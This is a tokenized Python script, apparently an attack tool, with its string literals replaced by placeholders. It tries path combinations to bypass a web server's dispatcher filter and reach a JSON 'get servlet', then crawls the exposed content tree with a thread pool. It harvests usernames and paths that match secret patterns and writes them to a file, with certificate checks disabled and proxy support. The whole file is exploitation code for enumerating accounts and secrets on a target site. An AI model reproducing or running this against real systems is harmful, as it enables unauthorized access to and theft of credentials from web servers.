import	os	
import	sys	
import	json	
import	time	
import	datetime	
import	argparse	
import	itertools	
import	traceback	
import	concurrent	.	futures	
from	threading	import	Lock	

import	dpath	
import	requests	

requests	.	packages	.	urllib3	.	disable_warnings	(	)	


users	=	set	(	)	
secrets	=	set	(	)	
lock	=	Lock	(	)	
running	=	True	


def	error	(	message	,	*	*	kwargs	)	:	
print	(	"str"	.	format	(	datetime	.	datetime	.	now	(	)	.	time	(	)	,	message	)	,	sys	.	stderr	)	
for	n	,	a	in	kwargs	.	items	(	)	:	
print	(	"str"	.	format	(	n	,	a	)	,	sys	.	stderr	)	

exc_type	,	exc_value	,	exc_traceback	=	sys	.	exc_info	(	)	
print	(	"str"	+	str	(	exc_type	)	,	sys	.	stderr	)	
print	(	"str"	+	str	(	exc_value	)	,	sys	.	stderr	)	
print	(	"str"	,	sys	.	stderr	)	
traceback	.	print_tb	(	exc_traceback	,	file	=	sys	.	stderr	)	
print	(	"str"	,	sys	.	stderr	)	


def	normalize_url	(	base_url	,	path	)	:	
if	base_url	[	-	1	]	==	"str"	and	(	path	[	0	]	==	"str"	or	path	[	0	]	==	"str"	)	:	
url	=	base_url	[	:	-	1	]	+	path	
else	:	
url	=	base_url	+	path	

return	url	


def	http_request	(	url	,	method	=	"str"	,	data	=	None	,	additional_headers	=	None	,	proxy	=	None	)	:	
headers	=	{	"str"	:	"str"	}	
if	additional_headers	:	
headers	.	update	(	additional_headers	)	

if	not	proxy	:	
proxy	=	{	}	

resp	=	requests	.	request	(	method	,	url	,	data	=	data	,	headers	=	headers	,	proxies	=	proxy	,	verify	=	False	,	timeout	=	20	,	allow_redirects	=	False	)	

return	resp	


def	dispatcher_bypass_get_servlet	(	base_url	,	proxy	,	debug	)	:	
BASE	=	(	"str"	,	"str"	)	
SUFFIX	=	(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	
"str"	,	"str"	,	"str"	,	"str"	,	"str"	)	

for	base	,	suffix	in	itertools	.	product	(	BASE	,	SUFFIX	)	:	
path	=	base	+	"str"	+	suffix	
url	=	normalize_url	(	base_url	,	path	)	

try	:	
resp	=	http_request	(	url	,	proxy	=	proxy	)	

if	resp	.	status_code	==	200	:	
try	:	
json	.	loads	(	resp	.	content	.	decode	(	)	)	[	"str"	]	
except	:	
pass	
else	:	
return	base	,	suffix	
except	:	
if	debug	:	
error	(	"str"	,	method	=	"str"	)	


def	process_node_get_servlet	(	tpe	,	base_url	,	base	,	suffix	,	current_depth	,	max_depth	,	grab_depth	,	proxy	,	debug	)	:	
USERS_GLOB	=	"str"	
SECRETS_GLOBS	=	(	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	"str"	,	
"str"	,	"str"	,	"str"	)	

users	=	set	(	)	
secrets	=	set	(	)	

if	current_depth	>	max_depth	:	
return	users	,	secrets	

try	:	
path	=	"str"	.	format	(	base	,	grab_depth	,	suffix	)	
url	=	normalize_url	(	base_url	,	path	)	

resp	=	http_request	(	url	,	proxy	=	proxy	)	

if	resp	.	status_code	!=	200	:	
return	users	

parsed	=	json	.	loads	(	resp	.	content	.	decode	(	)	)	

result	=	[	]	
for	d	in	range	(	grab_depth	)	:	
result	.	extend	(	list	(	dpath	.	util	.	search	(	parsed	,	"str"	*	d	+	USERS_GLOB	,	yielded	=	True	)	)	)	

for	_	,	username	in	result	:	
users	.	add	(	username	)	

for	s_glob	in	SECRETS_GLOBS	:	
results	=	[	]	
for	d	in	range	(	grab_depth	)	:	
results	.	extend	(	list	(	dpath	.	util	.	search	(	parsed	,	"str"	*	d	+	s_glob	,	yielded	=	True	)	)	)	

for	secret	,	_	in	results	:	
path	=	normalize_url	(	base_url	,	base	)	
secrets	.	add	(	"str"	.	format	(	path	,	secret	,	suffix	)	)	

paths_to_observe	=	set	(	)	
for	leaf	in	list	(	dpath	.	util	.	search	(	parsed	,	"str"	*	grab_depth	+	USERS_GLOB	,	yielded	=	True	)	)	:	
p	=	leaf	[	0	]	.	rsplit	(	"str"	,	1	)	[	0	]	
paths_to_observe	.	add	(	p	)	

for	p	in	paths_to_observe	:	
url	=	normalize_url	(	base_url	,	"str"	.	format	(	p	)	)	
params	=	(	tpe	,	url	,	base	,	suffix	,	current_depth	+	grab_depth	,	max_depth	,	grab_depth	,	proxy	,	debug	)	
future	=	tpe	.	submit	(	process_node_get_servlet	,	*	params	)	
future	.	add_done_callback	(	handle_finding	)	
except	:	
if	debug	:	
error	(	"str"	,	method	=	"str"	)	
finally	:	
return	users	,	secrets	


def	handle_finding	(	future	)	:	
global	users	,	secrets	,	lock	,	running	

if	future	.	done	(	)	:	
if	not	future	.	exception	(	)	:	
_users	,	_secrets	=	future	.	result	(	)	

with	lock	:	
running	=	True	
users	.	update	(	_users	)	
secrets	.	update	(	_secrets	)	


def	parse_args	(	)	:	
parser	=	argparse	.	ArgumentParser	(	description	=	"str"	)	

parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	type	=	int	,	default	=	2	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	type	=	int	,	default	=	4	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	type	=	int	,	default	=	10	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	default	=	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	help	=	"str"	)	
parser	.	add_argument	(	"str"	,	action	=	"str"	,	help	=	"str"	)	

return	parser	.	parse_args	(	sys	.	argv	[	1	:	]	)	


def	main	(	)	:	
global	users	,	secrets	,	running	,	lock	

args	=	parse_args	(	)	

if	args	.	proxy	:	
p	=	args	.	proxy	
proxy	=	{	"str"	:	p	,	"str"	:	p	}	
else	:	
proxy	=	{	}	

if	not	args	.	url	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

result	=	dispatcher_bypass_get_servlet	(	args	.	url	,	proxy	,	args	.	debug	)	

if	not	result	:	
print	(	"str"	)	
sys	.	exit	(	1337	)	

base	,	suffix	=	result	

if	args	.	base	:	
base	=	args	.	base	

with	concurrent	.	futures	.	ThreadPoolExecutor	(	args	.	workers	)	as	tpe	:	
params	=	(	tpe	,	args	.	url	,	base	,	suffix	,	0	,	args	.	maxdepth	,	args	.	grabdepth	,	proxy	,	args	.	debug	)	
future	=	tpe	.	submit	(	process_node_get_servlet	,	*	params	)	
future	.	add_done_callback	(	handle_finding	)	

while	running	:	
with	lock	:	
running	=	False	
time	.	sleep	(	30	)	

tpe	.	shutdown	(	wait	=	True	)	

with	open	(	args	.	out	,	"str"	)	as	outf	:	
outf	.	write	(	"str"	+	os	.	linesep	)	

for	user	in	users	:	
outf	.	write	(	"str"	.	format	(	user	,	os	.	linesep	)	)	

for	secret	in	secrets	:	
outf	.	write	(	"str"	.	format	(	secret	,	os	.	linesep	)	)	


if	__name__	==	"str"	:	
main	(	)	
	